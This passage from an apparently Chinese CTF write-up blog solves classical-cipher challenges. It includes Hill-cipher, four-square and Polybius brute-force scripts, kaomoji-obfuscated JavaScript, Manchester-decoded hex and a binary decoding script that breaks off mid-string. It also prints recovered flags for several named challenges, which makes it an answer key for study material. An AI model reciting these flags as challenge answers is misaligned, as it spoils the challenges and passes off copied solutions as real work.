punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c3<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>x1 <span class="token operator">=</span> getkey<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># wzu nqt caa</span>x2 <span class="token operator">=</span> getkey<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token punctuation">(</span>x1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> x1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span>    flag <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token punctuation">(</span>x2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> x2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># utflag&#123;d4nger0us_c1pherText_qq&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四方密码"><a href="#四方密码" class="headerlink" title="四方密码"></a>四方密码</h3><p><a href="http://ctf.ssleye.com/four.html">四方密码在线</a></p><p><a href="https://wtool.com.cn/four.html">四方密码在线2</a></p><h4 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h4><pre class="line-numbers language-none"><code class="language-none">key1:securitykey2:informationsecurityabdfghklmnopqvwxzinformatbcdeghklpqsuvwxyz密文啊这是，骚年加油：zhnjinhoopcfcuktlj解出来是：ypqcgaodrtccesnkqa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210727201446789.png" alt></p><p>再qiupquip一下就行了，我没解出来，这也太**了，为啥不直接就得flag呢。。。</p><pre class="line-numbers language-none"><code class="language-none">youngandsuccessful<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><h4 id="ctfshow、crypto3"><a href="#ctfshow、crypto3" class="headerlink" title="ctfshow、crypto3"></a>ctfshow、crypto3</h4><p><strong>TAG: jsfuck、颜文字</strong></p><p>给出的内容是一些特殊的字符，其实看起来是有一些眼熟的，但是就是想不起来，后来看看wp发现是我的浏览器上这个东西乱码</p><p><img src="/2021/05/28/CTF/image-20210720125250839.png" alt></p><p>我是先<code>另存界面为</code>，然后再打开另存出来的txt就会自动编好正确的码啦</p><pre class="line-numbers language-none"><code class="language-none">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210720144305920.png" alt></p><h3 id="波利比奥斯方阵密码"><a href="#波利比奥斯方阵密码" class="headerlink" title="波利比奥斯方阵密码"></a>波利比奥斯方阵密码</h3><p><img src="/2021/05/28/CTF/image-20210726132638982.png" alt="波利比奥斯方阵密码"></p><h4 id="BJDCTF2020-Polybius"><a href="#BJDCTF2020-Polybius" class="headerlink" title="[BJDCTF2020]Polybius"></a>[BJDCTF2020]Polybius</h4><p>题目中给出的信息为</p><pre class="line-numbers language-none"><code class="language-none">密文：ouauuuoooeeaaiaeauieuooeeieahint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ&#x3D;flag:解出明文后，请加上BJD&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将hint解base64之后得明文为<code>The length of this plaintext: 14</code></p><p>但是没有给出加密的表格，也就是棋盘密码中的棋盘，这就要一个个的碰撞，写出脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertoolshead <span class="token operator">=</span> <span class="token string">'aeiou'</span>ciphertext <span class="token operator">=</span> <span class="token string">'ouauuuoooeeaaiaeauieuooeeiea'</span>polybiusd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 创建波利比奥斯方阵</span><span class="token keyword">def</span> <span class="token function">polybius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">and</span> j <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>polybiusd<span class="token punctuation">)</span><span class="token comment"># 利用itertools.permutations()对字典进行全排列的性质进行字典的创建</span><span class="token keyword">def</span> <span class="token function">listall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    headlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    x <span class="token operator">=</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        headlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> headlist<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> j        dic<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span>    <span class="token keyword">return</span> dic<span class="token keyword">def</span> <span class="token function">PolybiusSolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 创建方阵</span>    polybius<span class="token punctuation">(</span><span class="token punctuation">)</span>    dic <span class="token operator">=</span> listall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        plaintext <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            plaintext <span class="token operator">+=</span> polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">[</span>ciphertext<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span>ciphertext<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>PolybiusSolve<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flagi\jspolybi\jus</span><span class="token comment"># flagispolybius</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有将i和j单独分开是因为会造成很多麻烦，所以这里要根据”语境”对是’i’或’j’来进行研判。</p><h3 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h3><h4 id="BJDCTF2020-编码与调制"><a href="#BJDCTF2020-编码与调制" class="headerlink" title="[BJDCTF2020]编码与调制"></a>[BJDCTF2020]编码与调制</h4><p><strong>TAG: 曼彻斯特编码</strong></p><p><img src="/2021/05/28/CTF/image-20210727124821706.png" alt></p><p>使用下载的软件解，按步骤进行即可，最后解码得出的十六进制为</p><pre class="line-numbers language-none"><code class="language-none">024A447B4469664D616E63686573746572636F64657D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210727125204272.png" alt></p><p>再在线解一下即得flag</p><h3 id="复杂古典密码"><a href="#复杂古典密码" class="headerlink" title="复杂古典密码"></a>复杂古典密码</h3><blockquote><p>所谓复杂，也不过就是多了几层套娃而已，近年来的套娃与爆破之风愈演愈烈，固而有此分类。</p></blockquote><h4 id="UTCTF2020-basic-crypto"><a href="#UTCTF2020-basic-crypto" class="headerlink" title="[UTCTF2020]basic-crypto"></a>[UTCTF2020]basic-crypto</h4><p>写个简单脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64t <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token triple-quoted-string string">"""01010101 01101000 00101101 01101111 01101000 00101100 00100000 01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 01101011 01100101 00100000 01110111 01100101 00100000 01101000 01100001 01110110 01100101 00100000 01100001 01101110 01101111 01110100 01101000 01100101 01110010 00100000 01100010 01101100 01101111 01100011 01101011 00100000 01101111 01100110 00100000 01110100 01100101 01111000 01110100 00101100 00100000 01110111 01101001 01110100 01101000 00100000 01110011 01101111 01101101 01100101 00100000 01110011 01101111 01110010 01110100 00100000 01101111 01100110 00100000 01110011 01110000 01100101 01100011 01101001 01100001 01101100 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00101110 00100000 01000011 01100001 01101110 00100000 01111001 01101111 01110101 00100000 01100110 01101001 01100111 01110101 01110010 01100101 00100000 01101111 01110101 01110100 00100000 01110111 01101000 01100001 01110100 00100000 01110100 01101000 01101001 01110011 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 01101001 01110011 00111111 00100000 00101000 01101000 01101001 01101110 01110100 00111010 00100000 01101001 01100110 00100000 01111001 01101111 01110101 00100000 01101100 01101111 01101111 01101011 00100000 01100011 01100001 01110010 01100101 01100110 01110101 01101100 01101100 01111001 00101100 00100000 01111001 01101111 01110101 00100111 01101100 01101100 00100000 01101110 01101111 01110100 01101001 01100011 01100101 00100000 01110100 01101000 01100001 01110100 00100000 01110100 01101000 01100101 01110010 01100101 00100000 01101111 01101110 01101100 01111001 00100000 01100011 01101000 01100001 01110010 01100001 01100011 01110100 01100101 01110010 01110011 00100000 01110000 01110010 01100101 01110011 01100101 01101110 01110100 00100000 01100001 01110010 01100101 00100000 01000001 00101101 01011010 00101100 00100000 01100001 00101101 01111010 00101100 00100000 00110000 00101101 00111001 00101100 00100000 01100001 01101110 01100100 00100000 01110011 01101111 01101101 01100101 01110100 01101001 01101101 01100101 01110011 00100000 00101111 00100000 01100001 01101110 01100100 00100000 00101011 00101110 00100000 01010011 01100101 01100101 00100000 01101001 01100110 00100000 01111001 01101111 01110101 00100000 01100011 01100001 01101110 00100000 01100110 01101001 01101110 01100100 00100000 01100001 01101110 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 01110100 01101000 01100001 01110100 00100000 01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 01101011 01100101 00100000 01110100 01101000 01101001 01110011 00100000 01101111 01101110 01100101 00101110 00101001 00001010 01010100 01101101 01010110 00110011 01001001 01000111 01001110 01101111 01011001 01010111 01111000 01110011 01011010 01010111 00110101 01101110 01011010 01010011 01000101 01100111 01010001 00110010 01000110 01110101 01001001 01001000 01101100 01110110 01100100 01010011 01000010 01101101 01100001 01010111 01100100 00110001 01100011 01101101 01010101 01100111 01100010 00110011 01010110 00110000 01001001 01001000 01100100 01101111 01011001 01011000 01010001 01101110 01100011 01111001 01000010 01101110 01100010 00110010 01101100 01110101 01011010 01111001 01000010 01110110 01100010 01101001 01000010 01101111 01011010 01011000 01001010 01101100 01010000 01111001 01000010 01001010 01100100 01000011 01000010 01110011 01100010 00110010 00111001 01110010 01100011 01111001 01000010 01110011 01100001 01010111 01110100 01101100 01001001 01001000 01010010 01101111 01011010 01010011 01000010 01110011 01011010 01011000 01010010 00110000 01011010 01011000 01001010 01111010 01001001 01000111 01000110 01111001 01011010 01010011 01000010 01111010 01100001 01000111 01101100 01101101 01100100 01000111 01010110 01101011 01001001 01000111 01001010 00110101 01001001 01001000 01001110 01110110 01100010 01010111 01010101 01100111 01011001 00110010 00111001 01110101 01100011 00110011 01010010 01101000 01100010 01101110 01010001 01110101 01001001 01000011 01101000 01101111 01100001 01010111 00110101 00110000 01001111 01101001 01000010 00110101 01100010 00110011 01010101 01100111 01100010 01010111 01101100 01101110 01100001 01001000 01010001 01100111 01100100 00110010 01000110 01110101 01100100 01000011 01000010 00110000 01100010 01111001 01000010 01111010 01100100 01000111 01000110 01111001 01100100 01000011 01000010 01110011 01100010 00110010 00111001 01110010 01100001 01010111 00110101 01101110 01001001 01001000 01010110 01110111 01001001 01000110 01001010 01110110 01100010 01010111 01000110 01110101 01001001 01001000 01000010 01101100 01100010 00110011 01000010 01110011 01011010 01010011 01101011 01110101 01000011 01101101 01110100 00110010 01011001 01101110 01001110 01111000 01100011 01101101 01010001 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01100100 01101001 01100010 01111001 01000010 01110010 01100100 01101110 01100100 00110101 01011001 00110010 01010001 01100111 01011010 01001000 01001010 01110110 01011001 01101101 00111000 01101000 01001001 01000110 01101000 00110101 01011010 01111001 01000010 01110111 01100101 01010111 01001001 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 01111010 01100101 01000111 01110100 00110010 01001001 01000011 01101000 01110010 01100101 01000111 00110100 01100111 01100100 00110010 01110100 01110000 01100010 01000111 00111000 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01001010 01110010 01011001 01101101 00110101 01110110 01011001 00110010 01010001 01110101 01001100 01101001 00110100 01110000 01001001 01001000 01110000 01110010 01011001 01101101 01010001 00110110 01001001 01000111 01110011 01100111 01011001 00110010 01010110 01110011 01011001 00110010 01010010 01111010 01011010 01000111 01010110 01101011 01100011 00110011 01101100 00110100 01001001 01000111 00110001 01111010 01100101 01101110 01001010 01110110 01011001 01101001 00110100 01100111 01010101 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 00110101 01100100 01101110 01011010 00110101 01011010 00110011 01001110 00110100 01100011 01010011 01000010 01101011 01100010 00110010 01101000 01101011 01001100 01000011 01000010 01010100 01001010 00110010 01011010 01110110 01001001 01000111 01010010 01110010 01100100 01010111 00111001 00110100 01001001 01001000 01100100 01110000 01001001 01001000 01100100 01110110 01011001 00110010 01001110 01110010 01100011 01010111 00111000 01100111 01100001 00110011 01101000 01110101 01001001 01000111 01001010 01110110 01100101 01101110 01011010 01110010 01100010 01010111 00111001 01110101 01001001 01000111 00111001 01101101 01100010 00110010 01001010 